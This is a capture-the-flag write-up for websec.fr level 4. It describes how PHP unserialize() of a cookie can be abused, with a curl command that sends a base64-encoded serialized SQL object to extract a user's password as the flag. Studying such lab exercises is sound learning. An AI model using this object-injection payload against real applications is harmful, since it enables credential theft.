### Directions
- Source #02 indicates the SQL query executes on `gc`.
	- Only prints username
		- if SQL injection, can be bypassed with `password as username`
- Weird Cookie
	- Can manipulate cookie data to the server
- [Level note hints at serialization](#Serialization)
- [SQL injection](#SQL injection)

## SQL injection
- Input appended to query
- Input numeric
	- Tried `0x`, `exponent` to no avail because sql injection needs proper strings
```PHP
`if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id']))
{
   try {
	   $sql->query .= $_REQUEST['id'];       } catch(Exception $e) {
		  echo ' Invalid query';
	}   
}`
```

## Serialization
- `unserialize` docs:

> **Warning**
	Do not pass untrusted user input to **unserialize()** regardless of the `options` value of `allowed_classes`. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via [json_decode()](https://devdocs.io/php/function.json-decode) and [json_encode()](https://devdocs.io/php/function.json-encode)) if you need to pass serialized data to the user.
	If you need to unserialize externally-stored serialized data, consider using [hash_hmac()](https://devdocs.io/php/function.hash-hmac) for data validation. Make sure data is not modified by anyone but you.

- php object serialization:
```PHP
<?
/*
Anatomy of a serialize()'ed value:

 String
 s:size:value;

 Integer
 i:value;

 Boolean
 b:value; (does not store "true" or "false", does store '1' or '0')

 Null
 N;

 Array
 a:size:{key definition;value definition;(repeated per element)}

 Object
 O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}

 String values are always in double quotes
 Array keys are always integers or strings
    "null => 'value'" equates to 's:0:"";s:5:"value";',
    "true => 'value'" equates to 'i:1;s:5:"value";',
    "false => 'value'" equates to 'i:0;s:5:"value";',
    "array(whatever the contents) => 'value'" equates to an "illegal offset type" warning because you can't use an
    array as a key; however, if you use a variable containing an array as a key, it will equate to 's:5:"Array";s:5:"value";',
     and
    attempting to use an object as a key will result in the same behavior as using an array will.
*/
?>
```
- Can create SQL object with query in cookie along the needed ip


# Solution
Creating an SQL object with the injection query which runs automatically
```shell
echo 'a:2:{s:2:"ip";s:?:"<MY IP>";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:49:"SELECT password as username FROM users WHERE id=1";}}' | base64 -w 0 > injection.txt
curl "http://websec.fr/level04/index.php"  --cookie "leet_hax0r=$(cat injection.txt)"
```
Gives us:
```HTML
<p class="well"><strong>Username:<strong> WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p>%       
```
